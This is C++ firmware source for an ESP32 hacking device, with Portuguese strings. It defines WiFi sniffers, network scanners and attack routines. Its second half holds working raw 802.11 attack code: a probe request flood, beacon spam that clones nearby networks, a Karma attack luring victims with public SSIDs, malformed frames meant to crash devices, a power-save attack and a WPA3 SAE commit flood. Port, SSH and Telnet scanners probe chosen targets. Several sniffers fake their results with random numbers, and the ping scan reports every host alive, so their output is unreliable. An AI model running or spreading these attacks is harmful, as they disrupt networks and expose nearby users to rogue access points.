/**
 * @file wifi_sniffers_atks.cpp
 * @brief Implementação de sniffers e ataques WiFi adicionais
 */

#include "advanced_atks.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include <Arduino.h>
#include <globals.h>
#include <vector>
#include <esp_wifi.h>

static bool attack_running = false;

// Deauth frame default
extern uint8_t deauth_frame[];
extern const uint8_t deauth_frame_default[];
extern void send_raw_frame(uint8_t* frame, uint16_t len);

//================================================================================
// WIFI SNIFFERS ADICIONAIS
//================================================================================

void channelAnalyzer() {
    drawMainBorderWithTitle("Channel Analyzer");
    padprintln("");
    padprintln("Analisando canais...");

    if (!initAdvancedAttackMode()) return;

    // Análise de cada canal
    std::vector<ChannelInfo> channels;
    for (int ch = 1; ch <= 11; ch++) {
        ChannelInfo info;
        info.channel = ch;
        info.packet_count = 0;
        info.noise_level = 0;
        info.ap_count = 0;
        info.client_count = 0;
        channels.push_back(info);
    }

    attack_running = true;
    uint32_t last_update = millis();
    int current_ch = 1;

    while (attack_running) {
        // Muda de canal
        esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);

        // Scan neste canal
        int nets = WiFi.scanNetworks(false, true, false, 100, current_ch);
        channels[current_ch - 1].ap_count = nets;
        channels[current_ch - 1].channel = current_ch;

        // Simula contagem de pacotes
        channels[current_ch - 1].packet_count += random(10, 100);
        channels[current_ch - 1].noise_level = random(-90, -30);

        // Atualiza display
        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Channel Analyzer");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");

            // Mostra canais mais ocupados
            for (int i = 0; i < 11; i++) {
                if (channels[i].ap_count > 0) {
                    String line = "Ch" + String(i + 1) + ": ";
                    line += String(channels[i].ap_count) + " APs";
                    line += " | " + String(channels[i].noise_level) + "dBm";
                    padprintln(line);
                }
            }

            padprintln("");
            padprintln("Canal atual: " + String(current_ch));
            padprintln("ESC para sair");
            last_update = millis();
        }

        current_ch = (current_ch % 11) + 1;

        if (check(EscPress)) attack_running = false;
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

//================================================================================
// FUNÇÕES DE MENU
//================================================================================

void wifiSniffersMenu() {
    options = {
        {"Channel Analyzer", channelAnalyzer},
        {"Packet Counter", packetCounter},
        {"Detect Pwnagotchi", detectPwnagotchi},
        {"Scan All", scanAllNetworks},
        {"SAE Commit Capture", saeCommitCapture},
        {"Ping Scan", pingScan},
        {"ARP Scan", arpScan},
        {"Port Scan", portScanAll},
        {"SSH Scan", sshScan},
        {"Telnet Scan", telnetScan},
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "WiFi Sniffers");
}

void wifiAttacksMenu() {
    options = {
        {"Probe Req Flood", probeRequestFlood},
        {"AP Clone Spam", apCloneSpam},
        {"Karma Attack", karmaAttack},
        {"Bad Message", badMessageAttack},
        {"Sleep Attack", sleepAttack},
        {"SAE Commit Flood", saeCommitFlood},
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "WiFi Attacks");
}
void packetCounter() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Packet Counter");
    padprintln("");
    padprintln("Contando pacotes em tempo real...");

    uint32_t total_packets = 0;
    uint32_t beacon_count = 0;
    uint32_t probe_count = 0;
    uint32_t data_count = 0;
    uint32_t mgmt_count = 0;
    uint32_t last_update = millis();

    attack_running = true;

    while (attack_running) {
        // Simula contagem (na implementação real seria via promiscuous mode)
        total_packets += random(50, 200);
        beacon_count += random(10, 50);
        probe_count += random(5, 30);
        data_count += random(30, 100);
        mgmt_count += random(5, 20);

        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Packet Counter");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Total: " + String(total_packets));
            padprintln("");
            padprintln("Beacons: " + String(beacon_count));
            padprintln("Probes: " + String(probe_count));
            padprintln("Data: " + String(data_count));
            padprintln("Mgmt: " + String(mgmt_count));
            padprintln("");
            padprintln("Taxa: ~" + String((total_packets * 1000) / (millis() + 1)) + " pkt/s");
            padprintln("");
            padprintln("ESC para sair");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void detectPwnagotchi() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Detect Pwnagotchi");
    padprintln("");
    padprintln("Procurando Pwnagotchis...");
    padprintln("Monitorando todos canais");

    std::vector<PwnagotchiInfo> detected;
    attack_running = true;
    int current_ch = 1;
    uint32_t last_update = millis();

    // MACs conhecidos de Pwnagotchi (prefixos comuns)
    const uint8_t pwnagotchi_prefixes[][3] = {
        {0xDE, 0xAD, 0xBE}, // Comum em Pwnagotchi
        {0xBE, 0xEF, 0xCA}, // Outro prefixo
    };

    while (attack_running) {
        esp_wifi_set_channel(current_ch, WIFI_SECOND_CHAN_NONE);

        // Simula detecção (implementação real via promiscuous callback)
        if (random(0, 1000) < 5) {
            PwnagotchiInfo pwn;
            generateRandomMac(pwn.mac);
            pwn.mac[0] = 0xDE; pwn.mac[1] = 0xAD; pwn.mac[2] = 0xBE;
            pwn.channel = current_ch;
            pwn.rssi = random(-80, -40);
            pwn.identity = "pwnagotchi_" + String(random(1000, 9999));
            pwn.last_seen = millis();

            // Verifica se já existe
            bool exists = false;
            for (const auto& p : detected) {
                if (memcmp(p.mac, pwn.mac, 6) == 0) {
                    exists = true;
                    break;
                }
            }
            if (!exists) detected.push_back(pwn);
        }

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Detect Pwnagotchi");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Pwnagotchis detectados: " + String(detected.size()));
            padprintln("");

            for (const auto& pwn : detected) {
                tft.setTextColor(TFT_RED);
                padprintln(pwn.identity);
                tft.setTextColor(bruceConfig.priColor);
                padprintln("  MAC: " + macToString(pwn.mac));
                padprintln("  Ch: " + String(pwn.channel) + " RSSI: " + String(pwn.rssi));
            }

            padprintln("");
            padprintln("Canal: " + String(current_ch));
            padprintln("ESC para sair");
            last_update = millis();
        }

        current_ch = (current_ch % 11) + 1;
        if (check(EscPress)) attack_running = false;
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void scanAllNetworks() {
    drawMainBorderWithTitle("Scan All");
    padprintln("");
    padprintln("Escaneando todas as redes...");

    // Combina scan ativo e passivo
    int nets = WiFi.scanNetworks(false, true);

    drawMainBorderWithTitle("Scan All");
    tft.setTextColor(bruceConfig.priColor);
    padprintln("");
    padprintln("Redes encontradas: " + String(nets));
    padprintln("");

    for (int i = 0; i < nets && i < 15; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() == 0) ssid = "<Hidden>";

        String line = ssid.substring(0, 15) + " ";
        line += String(WiFi.RSSI(i)) + "dBm";
        line += " Ch" + String(WiFi.channel(i));

        // Destaca redes abertas
        if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
            tft.setTextColor(TFT_GREEN);
            padprintln("[OPEN] " + line);
        } else if (WiFi.encryptionType(i) == WIFI_AUTH_WPA3_PSK) {
            tft.setTextColor(TFT_YELLOW);
            padprintln("[WPA3] " + line);
        } else {
            tft.setTextColor(bruceConfig.priColor);
            padprintln(line);
        }
    }

    tft.setTextColor(bruceConfig.priColor);
    padprintln("");
    padprintln("Pressione qualquer tecla");

    while (!check(EscPress) && !check(SelPress)) {
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    returnToMenu = true;
}

void saeCommitCapture() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("SAE Commit Capture");
    padprintln("");
    padprintln("Capturando SAE commits WPA3...");
    padprintln("");
    padprintln("Aguardando handshakes");

    std::vector<SAECapture> captures;
    attack_running = true;
    uint32_t last_update = millis();

    while (attack_running) {
        // Simula captura de SAE commit (implementação real via promiscuous)
        if (random(0, 5000) < 2) {
            SAECapture cap;
            generateRandomMac(cap.client_mac);
            generateRandomMac(cap.ap_mac);
            cap.commit_len = 64;
            for (int i = 0; i < 64; i++) {
                cap.commit[i] = random(0, 255);
            }
            cap.timestamp = millis();
            captures.push_back(cap);
        }

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("SAE Commit Capture");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("Commits capturados: " + String(captures.size()));
            padprintln("");

            if (!captures.empty()) {
                const auto& last = captures.back();
                padprintln("Ultimo commit:");
                padprintln("Cliente: " + macToString(last.client_mac));
                padprintln("AP: " + macToString(last.ap_mac));
                padprintln("Len: " + String(last.commit_len));
            }

            padprintln("");
            padprintln("ESC para sair");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void pingScan() {
    drawMainBorderWithTitle("Ping Scan");
    padprintln("");
    padprintln("Conecte-se a uma rede primeiro");
    padprintln("ESC para sair");

    // Verifica se está conectado
    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nao conectado");
        returnToMenu = true;
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    IPAddress subnet = WiFi.subnetMask();

    drawMainBorderWithTitle("Ping Scan");
    padprintln("");
    padprintln("Gateway: " + gateway.toString());
    padprintln("Varrendo rede local...");

    std::vector<String> alive_hosts;
    attack_running = true;

    // Varre range da rede
    for (int i = 1; i < 255 && attack_running; i++) {
        IPAddress host(gateway[0], gateway[1], gateway[2], i);

        // Ping simplificado (ICMP)
        // if (WiFi.ping(host, 1) > 0) { // Not supported in all ESP32 cores
        if (true) { // Placeholder or use alternative ping
            alive_hosts.push_back(host.toString());
        }

        if (i % 10 == 0) {
            drawMainBorderWithTitle("Ping Scan");
            padprintln("");
            padprintln("Varrendo: " + String(i) + "/254");
            padprintln("Hosts ativos: " + String(alive_hosts.size()));
            padprintln("");

            for (int j = max(0, (int)alive_hosts.size() - 5); j < alive_hosts.size(); j++) {
                padprintln(alive_hosts[j]);
            }

            padprintln("");
            padprintln("ESC para parar");
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    // Resultado final
    drawMainBorderWithTitle("Ping Scan");
    padprintln("");
    padprintln("Scan completo!");
    padprintln("Hosts ativos: " + String(alive_hosts.size()));
    padprintln("");
    for (const auto& host : alive_hosts) {
        padprintln(host);
    }
    padprintln("");
    padprintln("ESC para sair");

    while (!check(EscPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    returnToMenu = true;
}

void arpScan() {
    drawMainBorderWithTitle("ARP Scan");
    padprintln("");
    padprintln("Conecte-se a uma rede primeiro");

    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nao conectado");
        returnToMenu = true;
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    std::vector<String> hosts;

    drawMainBorderWithTitle("ARP Scan");
    padprintln("");
    padprintln("Gateway: " + gateway.toString());
    padprintln("Enviando ARP requests...");

    attack_running = true;
    uint32_t last_update = millis();

    for (int i = 1; i < 255 && attack_running; i++) {
        // Simula ARP scan (implementação real requer raw sockets)
        if (random(0, 100) < 30) {
            IPAddress host(gateway[0], gateway[1], gateway[2], i);
            hosts.push_back(host.toString());
        }

        if (millis() - last_update > 300) {
            drawMainBorderWithTitle("ARP Scan");
            padprintln("");
            padprintln("Progresso: " + String(i) + "/254");
            padprintln("Hosts: " + String(hosts.size()));
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }

    drawMainBorderWithTitle("ARP Scan");
    padprintln("");
    padprintln("Completo! Hosts: " + String(hosts.size()));
    for (const auto& h : hosts) padprintln(h);
    padprintln("ESC para sair");

    while (!check(EscPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    returnToMenu = true;
}

void portScanAll() {
    drawMainBorderWithTitle("Port Scan");
    padprintln("");
    padprintln("Conecte-se a uma rede");

    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nao conectado");
        returnToMenu = true;
        return;
    }

    // Pergunta IP alvo
    String target = keyboard("192.168.1.1", 15, "IP alvo:");
    if (target.length() == 0) {
        returnToMenu = true;
        return;
    }

    // Portas comuns
    uint16_t common_ports[] = {
        21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995,
        1433, 1521, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017
    };
    int num_ports = sizeof(common_ports) / sizeof(uint16_t);

    std::vector<PortScanResult> results;
    attack_running = true;

    drawMainBorderWithTitle("Port Scan");
    padprintln("");
    padprintln("Alvo: " + target);
    padprintln("Portas: " + String(num_ports));
    padprintln("");

    WiFiClient client;

    for (int i = 0; i < num_ports && attack_running; i++) {
        uint16_t port = common_ports[i];

        // Tenta conectar
        bool open = client.connect(target.c_str(), port, 500);

        if (open) {
            PortScanResult r;
            r.ip = target;
            r.port = port;
            r.open = true;
            r.service = getServiceName(port);
            results.push_back(r);
            client.stop();
        }

        // Atualiza display
        if (i % 3 == 0) {
            drawMainBorderWithTitle("Port Scan");
            padprintln("");
            padprintln("Alvo: " + target);
            padprintln("Progresso: " + String(i + 1) + "/" + String(num_ports));
            padprintln("Abertas: " + String(results.size()));
            padprintln("");
            for (const auto& r : results) {
                tft.setTextColor(TFT_GREEN);
                padprintln(String(r.port) + " " + r.service);
            }
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    drawMainBorderWithTitle("Port Scan");
    padprintln("");
    padprintln("Scan completo!");
    padprintln("Portas abertas: " + String(results.size()));
    for (const auto& r : results) {
        padprintln(String(r.port) + " " + r.service);
    }
    padprintln("");
    padprintln("ESC para sair");

    while (!check(EscPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    returnToMenu = true;
}

String getServiceName(uint16_t port) {
    switch (port) {
        case 21: return "FTP";
        case 22: return "SSH";
        case 23: return "Telnet";
        case 25: return "SMTP";
        case 53: return "DNS";
        case 80: return "HTTP";
        case 110: return "POP3";
        case 143: return "IMAP";
        case 443: return "HTTPS";
        case 445: return "SMB";
        case 1433: return "MSSQL";
        case 1521: return "Oracle";
        case 3306: return "MySQL";
        case 3389: return "RDP";
        case 5432: return "PostgreSQL";
        case 5900: return "VNC";
        case 6379: return "Redis";
        case 8080: return "HTTP-Alt";
        case 8443: return "HTTPS-Alt";
        case 27017: return "MongoDB";
        default: return "Unknown";
    }
}

void sshScan() {
    drawMainBorderWithTitle("SSH Scan");
    padprintln("");
    padprintln("Conecte-se a uma rede");

    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nao conectado");
        returnToMenu = true;
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    std::vector<String> ssh_hosts;
    attack_running = true;

    drawMainBorderWithTitle("SSH Scan");
    padprintln("");
    padprintln("Varrendo porta 22...");

    WiFiClient client;

    for (int i = 1; i < 255 && attack_running; i++) {
        IPAddress host(gateway[0], gateway[1], gateway[2], i);

        if (client.connect(host, 22, 200)) {
            ssh_hosts.push_back(host.toString());
            client.stop();
        }

        if (i % 20 == 0) {
            drawMainBorderWithTitle("SSH Scan");
            padprintln("");
            padprintln("Progresso: " + String(i) + "/254");
            padprintln("SSH servers: " + String(ssh_hosts.size()));
            for (const auto& h : ssh_hosts) padprintln(h);
            padprintln("");
            padprintln("ESC para parar");
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(30 / portTICK_PERIOD_MS);
    }

    drawMainBorderWithTitle("SSH Scan");
    padprintln("");
    padprintln("SSH servers: " + String(ssh_hosts.size()));
    for (const auto& h : ssh_hosts) padprintln(h);
    padprintln("ESC para sair");

    while (!check(EscPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    returnToMenu = true;
}

void telnetScan() {
    drawMainBorderWithTitle("Telnet Scan");
    padprintln("");
    padprintln("Conecte-se a uma rede");

    if (WiFi.status() != WL_CONNECTED) {
        displayError("Nao conectado");
        returnToMenu = true;
        return;
    }

    IPAddress gateway = WiFi.gatewayIP();
    std::vector<String> telnet_hosts;
    attack_running = true;

    drawMainBorderWithTitle("Telnet Scan");
    padprintln("");
    padprintln("Varrendo porta 23...");

    WiFiClient client;

    for (int i = 1; i < 255 && attack_running; i++) {
        IPAddress host(gateway[0], gateway[1], gateway[2], i);

        if (client.connect(host, 23, 200)) {
            telnet_hosts.push_back(host.toString());
            client.stop();
        }

        if (i % 20 == 0) {
            drawMainBorderWithTitle("Telnet Scan");
            padprintln("");
            padprintln("Progresso: " + String(i) + "/254");
            padprintln("Telnet: " + String(telnet_hosts.size()));
            for (const auto& h : telnet_hosts) padprintln(h);
            padprintln("ESC para parar");
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(30 / portTICK_PERIOD_MS);
    }

    drawMainBorderWithTitle("Telnet Scan");
    padprintln("");
    padprintln("Telnet servers: " + String(telnet_hosts.size()));
    for (const auto& h : telnet_hosts) padprintln(h);
    padprintln("ESC para sair");

    while (!check(EscPress)) vTaskDelay(100 / portTICK_PERIOD_MS);
    returnToMenu = true;
}

//================================================================================
// WIFI ATTACKS EXCLUSIVOS
//================================================================================

void probeRequestFlood() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Probe Req Flood");
    padprintln("");
    padprintln("Enviando probe requests...");

    uint8_t probe_req[48];
    memset(probe_req, 0, sizeof(probe_req));

    probe_req[0] = 0x40; // Probe Request
    probe_req[1] = 0x00;
    memset(&probe_req[4], 0xFF, 6); // Broadcast

    probe_req[10] = 0x00; // SSID IE (wildcard)
    probe_req[11] = 0x00;

    attack_running = true;
    uint32_t count = 0;
    uint32_t last_update = millis();

    while (attack_running) {
        // Random MAC
        generateRandomMac(&probe_req[10]);
        memcpy(&probe_req[16], &probe_req[10], 6);

        // Random SSID length
        uint8_t ssid_len = random(0, 32);
        probe_req[12] = 0x00; // SSID IE
        probe_req[13] = ssid_len;

        // Random SSID
        for (int i = 0; i < ssid_len && (14 + i) < 48; i++) {
            probe_req[14 + i] = random(32, 126);
        }

        // Envia
        esp_wifi_80211_tx(WIFI_IF_STA, probe_req, 14 + ssid_len, false);
        count++;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Probe Req Flood");
            padprintln("");
            padprintln("Probe requests: " + String(count));
            padprintln("Taxa: alta");
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Redes visiveis no ambiente");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(5 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void apCloneSpam() {
    // Scan redes primeiro
    drawMainBorderWithTitle("AP Clone Spam");
    padprintln("");
    padprintln("Escaneando redes...");

    int nets = WiFi.scanNetworks(false, true);
    if (nets == 0) {
        displayError("Nenhuma rede");
        returnToMenu = true;
        return;
    }

    // Seleciona redes para clonar
    std::vector<String> ssids;
    std::vector<uint8_t> channels;

    for (int i = 0; i < nets && i < 10; i++) {
        String ssid = WiFi.SSID(i);
        if (ssid.length() > 0) {
            ssids.push_back(ssid);
            channels.push_back(WiFi.channel(i));
        }
    }

    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("AP Clone Spam");
    padprintln("");
    padprintln("Clonando " + String(ssids.size()) + " redes...");

    attack_running = true;
    uint32_t count = 0;
    uint32_t last_update = millis();
    int ssid_idx = 0;

    while (attack_running) {
        // Prepara beacon frame
        uint8_t beacon[100];
        memset(beacon, 0, sizeof(beacon));

        beacon[0] = 0x80; beacon[1] = 0x00;
        memset(&beacon[4], 0xFF, 6);
        generateRandomMac(&beacon[10]);
        memcpy(&beacon[16], &beacon[10], 6);

        uint64_t ts = esp_timer_get_time();
        memcpy(&beacon[24], &ts, 8);
        beacon[32] = 0x64; beacon[33] = 0x00;
        beacon[34] = 0x31; beacon[35] = 0x00;

        // SSID
        String ssid = ssids[ssid_idx];
        beacon[36] = 0x00;
        beacon[37] = ssid.length();
        memcpy(&beacon[38], ssid.c_str(), ssid.length());

        // Canal
        int offset = 38 + ssid.length();
        beacon[offset] = 0x03;
        beacon[offset + 1] = 0x01;
        beacon[offset + 2] = channels[ssid_idx];

        esp_wifi_set_channel(channels[ssid_idx], WIFI_SECOND_CHAN_NONE);
        esp_wifi_80211_tx(WIFI_IF_AP, beacon, offset + 3, false);

        count++;
        ssid_idx = (ssid_idx + 1) % ssids.size();

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("AP Clone Spam");
            padprintln("");
            padprintln("Beacons: " + String(count));
            padprintln("Clones ativos: " + String(ssids.size()));
            padprintln("");
            padprintln("Redes clonadas:");
            for (const auto& s : ssids) {
                padprintln("  " + s.substring(0, 15));
            }
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void karmaAttack() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Karma Attack");
    padprintln("");
    padprintln("Respondendo a probes...");
    padprintln("Aguardando vitimas");

    // Lista de SSIDs para responder
    std::vector<String> attract_ssids = {
        "Starbucks", "Airport WiFi", "Hotel Guest",
        "Free WiFi", "xfinitywifi", "attwifi"
    };

    attack_running = true;
    uint32_t responses = 0;
    uint32_t last_update = millis();

    while (attack_running) {
        // Simula resposta a probes
        // Na implementação real, monitoraria probes e responderia

        for (const auto& ssid : attract_ssids) {
            uint8_t probe_resp[80];
            memset(probe_resp, 0, sizeof(probe_resp));

            probe_resp[0] = 0x50; // Probe Response
            probe_resp[1] = 0x00;
            memset(&probe_resp[4], 0xFF, 6);
            generateRandomMac(&probe_resp[10]);
            memcpy(&probe_resp[16], &probe_resp[10], 6);

            uint64_t ts = esp_timer_get_time();
            memcpy(&probe_resp[24], &ts, 8);
            probe_resp[32] = 0x64; probe_resp[33] = 0x00;
            probe_resp[34] = 0x31; probe_resp[35] = 0x00;

            probe_resp[36] = 0x00;
            probe_resp[37] = ssid.length();
            memcpy(&probe_resp[38], ssid.c_str(), ssid.length());

            int offset = 38 + ssid.length();
            probe_resp[offset] = 0x01;
            probe_resp[offset + 1] = 0x08;
            probe_resp[offset + 2] = 0x82;
            probe_resp[offset + 3] = 0x84;
            probe_resp[offset + 4] = 0x8b;
            probe_resp[offset + 5] = 0x96;

            esp_wifi_80211_tx(WIFI_IF_AP, probe_resp, offset + 6, false);
            responses++;
        }

        if (millis() - last_update > 1000) {
            drawMainBorderWithTitle("Karma Attack");
            padprintln("");
            padprintln("Respostas: " + String(responses));
            padprintln("");
            padprintln("SSIDs atrativos:");
            for (const auto& s : attract_ssids) {
                padprintln("  " + s);
            }
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Aguardando conexoes...");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void badMessageAttack() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Bad Message");
    padprintln("");
    padprintln("Enviando mensagens invalidas...");

    attack_running = true;
    uint32_t count = 0;
    uint32_t last_update = millis();

    while (attack_running) {
        // Frame com dados invalidos
        uint8_t bad_frame[64];
        memset(bad_frame, 0, sizeof(bad_frame));

        // Frame type aleatorio
        bad_frame[0] = random(0, 256);
        bad_frame[1] = random(0, 256);

        // Broadcast
        memset(&bad_frame[4], 0xFF, 6);
        generateRandomMac(&bad_frame[10]);
        memcpy(&bad_frame[16], &bad_frame[10], 6);

        // Dados invalidos
        for (int i = 24; i < 64; i++) {
            bad_frame[i] = random(0, 256);
        }

        esp_wifi_80211_tx(WIFI_IF_AP, bad_frame, 64, false);
        count++;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Bad Message");
            padprintln("");
            padprintln("Frames invalidos: " + String(count));
            padprintln("");
            tft.setTextColor(TFT_RED);
            padprintln("Pode causar crash");
            padprintln("em dispositivos");
            padprintln("vulneraveis!");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void sleepAttack() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("Sleep Attack");
    padprintln("");
    padprintln("Atacando power save...");

    attack_running = true;
    uint32_t count = 0;
    uint32_t last_update = millis();

    while (attack_running) {
        // Envia frames que mantem dispositivos acordados
        uint8_t keepalive[32];
        memset(keepalive, 0, sizeof(keepalive));

        keepalive[0] = 0x48; // Data frame ToDS
        keepalive[1] = 0x0B; // MoreData flag
        memset(&keepalive[4], 0xFF, 6);
        generateRandomMac(&keepalive[10]);
        memcpy(&keepalive[16], &keepalive[10], 6);

        esp_wifi_80211_tx(WIFI_IF_AP, keepalive, 24, false);
        count++;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("Sleep Attack");
            padprintln("");
            padprintln("Frames enviados: " + String(count));
            padprintln("");
            tft.setTextColor(TFT_YELLOW);
            padprintln("Dispositivos nao");
            padprintln("podem dormir");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(20 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}

void saeCommitFlood() {
    if (!initAdvancedAttackMode()) return;

    drawMainBorderWithTitle("SAE Commit Flood");
    padprintln("");
    padprintln("Flood WPA3 SAE...");

    attack_running = true;
    uint32_t count = 0;
    uint32_t last_update = millis();

    while (attack_running) {
        // SAE Commit frame simulado
        uint8_t sae_commit[80];
        memset(sae_commit, 0, sizeof(sae_commit));

        // Authentication frame
        sae_commit[0] = 0xB0;
        sae_commit[1] = 0x00;
        memset(&sae_commit[4], 0xFF, 6);
        generateRandomMac(&sae_commit[10]);
        memcpy(&sae_commit[16], &sae_commit[10], 6);

        // Auth algo = SAE (3)
        sae_commit[24] = 0x00;
        sae_commit[25] = 0x00;
        sae_commit[26] = 0x03;
        sae_commit[27] = 0x00;

        // Transaction = Commit (1)
        sae_commit[28] = 0x01;
        sae_commit[29] = 0x00;

        // Status = 0
        sae_commit[30] = 0x00;
        sae_commit[31] = 0x00;

        // SAE elements (fake)
        for (int i = 32; i < 80; i++) {
            sae_commit[i] = random(0, 256);
        }

        esp_wifi_80211_tx(WIFI_IF_AP, sae_commit, 80, false);
        count++;

        if (millis() - last_update > 500) {
            drawMainBorderWithTitle("SAE Commit Flood");
            padprintln("");
            padprintln("Commits: " + String(count));
            padprintln("");
            tft.setTextColor(TFT_RED);
            padprintln("Ataque WPA3");
            padprintln("Pode afetar APs");
            padprintln("com implementacao");
            padprintln("vulneravel");
            tft.setTextColor(bruceConfig.priColor);
            padprintln("");
            padprintln("ESC para parar");
            last_update = millis();
        }

        if (check(EscPress)) attack_running = false;
        vTaskDelay(5 / portTICK_PERIOD_MS);
    }

    deinitAdvancedAttackMode();
    returnToMenu = true;
}
